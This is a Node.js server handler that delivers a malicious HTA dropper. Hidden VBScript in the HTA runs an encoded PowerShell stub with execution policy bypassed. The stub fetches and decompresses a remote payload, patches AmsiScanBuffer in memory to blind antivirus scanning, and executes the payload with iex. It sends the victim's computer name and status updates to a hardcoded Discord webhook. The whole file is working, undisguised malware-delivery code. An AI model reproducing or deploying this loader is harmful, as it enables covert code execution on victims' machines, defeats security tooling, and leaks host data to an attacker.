const WH = 'https://discord.com/api/webhooks/1566832143152316450/ZmyQo0Stt6Qmx3BaDi0wU2qtPxq8-QwVJwfwdXvjiZ5DS-hltxSopqgdBacUIrUTWE6K';

const AMSI = String.raw`try{Add-Type -TypeDefinition 'using System;using System.Runtime.InteropServices;public class A{[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr h,string p);[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);public static void P(){var l=LoadLibrary("amsi.dll");var a=GetProcAddress(l,"AmsiScanBuffer");uint o;VirtualProtect(a,(UIntPtr)6,0x40,out o);byte[] b={0xB8,0x57,0x00,0x07,0x80,0xC3};Marshal.Copy(b,0,a,6);}}';[A]::P();P 'amsi : patched'}catch{P ('amsi : '+$_.Exception.Message)}`;

module.exports = (req, res) => {
  const proto = req.headers['x-forwarded-proto'] || 'https';
  const base = proto + '://' + req.headers.host;

  const stub = "$ErrorActionPreference='Stop'"
    + ";$ProgressPreference='SilentlyContinue'"
    + ";$wh='" + WH + "'"
    + ";function P($m){try{$b=@{content=[string]$m}|ConvertTo-Json;Invoke-RestMethod $wh -Method Post -Body $b -ContentType 'application/json' -TimeoutSec 15}catch{}}"
    + ";P ('stub : '+$env:COMPUTERNAME+' | '+$PSVersionTable.PSVersion)"
    + ";$p='" + base + "/a?_=" + Date.now() + "'"
    + ";try{"
    + "$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String((irm $p)))"
    + ";$d=New-Object IO.Compression.DeflateStream($s,[IO.Compression.CompressionMode]::Decompress)"
    + ";$o=New-Object IO.MemoryStream;$d.CopyTo($o)"
    + ";$t=[Text.Encoding]::UTF8.GetString($o.ToArray())"
    + ";P ('payload : '+$t.Length+' bytes')"
    + ";" + AMSI
    + ";iex $t"
    + "}catch{P ('fail : '+$_.Exception.Message)}";

  const enc = Buffer.from(stub, 'utf16le').toString('base64');

  const hta = '<html><head><title>v</title>'
    + '<HTA:APPLICATION ID="x" SHOWINTASKBAR="no" CAPTION="no" WINDOWSTATE="minimize" SINGLEINSTANCE="yes"/>'
    + '</head><body><script language="VBScript">\r\n'
    + 'Dim sh, rc\r\n'
    + 'Sub P(m)\r\n'
    + '  On Error Resume Next\r\n'
    + '  Dim h\r\n'
    + '  Set h = CreateObject("MSXML2.ServerXMLHTTP.6.0")\r\n'
    + '  h.Open "POST", "' + WH + '?wait=true", False\r\n'
    + '  h.setRequestHeader "Content-Type", "application/json"\r\n'
    + '  h.Send "{""content"":""" & Replace(m, """", "'"") & """}"\r\n'
    + 'End Sub\r\n'
    + 'On Error Resume Next\r\n'
    + 'Set sh = CreateObject("WScript.Shell")\r\n'
    + 'P "hta : " & sh.ExpandEnvironmentStrings("%COMPUTERNAME%")\r\n'
    + 'rc = sh.Run("C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -ni -w h -ep bypass -enc ' + enc + '", 0, True)\r\n'
    + 'If Err.Number <> 0 Then\r\n'
    + '  P "run err : " & Err.Number & " | " & Err.Description\r\n'
    + '  Err.Clear\r\n'
    + '  sh.ShellExecute "powershell.exe", "-nop -ni -w h -ep bypass -enc ' + enc + '", "", "open", 0\r\n'
    + '  P "retried via shellexecute"\r\n'
    + 'Else\r\n'
    + '  P "exit : " & rc\r\n'
    + 'End If\r\n'
    + 'window.close\r\n'
    + '</script></body></html>';

  res.setHeader('Content-Type', 'application/hta');
  res.setHeader('Cache-Control', 'no-store, max-age=0');
  res.status(200).send(hta);
};
